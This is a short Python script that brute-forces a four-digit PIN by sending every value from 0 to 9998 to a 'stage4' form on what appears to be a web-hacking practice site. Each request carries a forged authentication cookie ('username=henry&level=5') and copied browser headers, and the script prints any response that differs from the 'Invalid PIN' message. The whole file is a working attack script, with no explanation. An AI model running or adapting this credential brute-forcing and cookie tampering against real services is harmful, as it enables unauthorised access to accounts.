import requests

for i in range(0,9999):

	url = "https://webhacker.apphb.com/4251c282-01f9-4cbb-8d01-16eb3e800eee/stage4"

	payload='Pin='+str(i)
	headers = {
	  'authority': 'webhacker.apphb.com',
	  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	  'accept-language': 'en-GB,en;q=0.9',
	  'cache-control': 'no-cache',
	  'content-type': 'application/x-www-form-urlencoded',
	  'cookie': 'auth=username=henry&level=5',
	  'dnt': '1',
	  'origin': 'https://webhacker.apphb.com',
	  'pragma': 'no-cache',
	  'referer': 'https://webhacker.apphb.com/4251c282-01f9-4cbb-8d01-16eb3e800eee/stage4',
	  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
	  'sec-ch-ua-mobile': '?0',
	  'sec-ch-ua-platform': '"macOS"',
	  'sec-fetch-dest': 'document',
	  'sec-fetch-mode': 'navigate',
	  'sec-fetch-site': 'same-origin',
	  'sec-fetch-user': '?1',
	  'sec-gpc': '1',
	  'upgrade-insecure-requests': '1',
	  'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
	}

	response = requests.request("POST", url, headers=headers, data=payload)

	print(payload)

	if "Invalid PIN" in str(response.text):
		print("Invalid")
	else:
		print("Received a response different from standard Invalid Response")
		print(response.text)
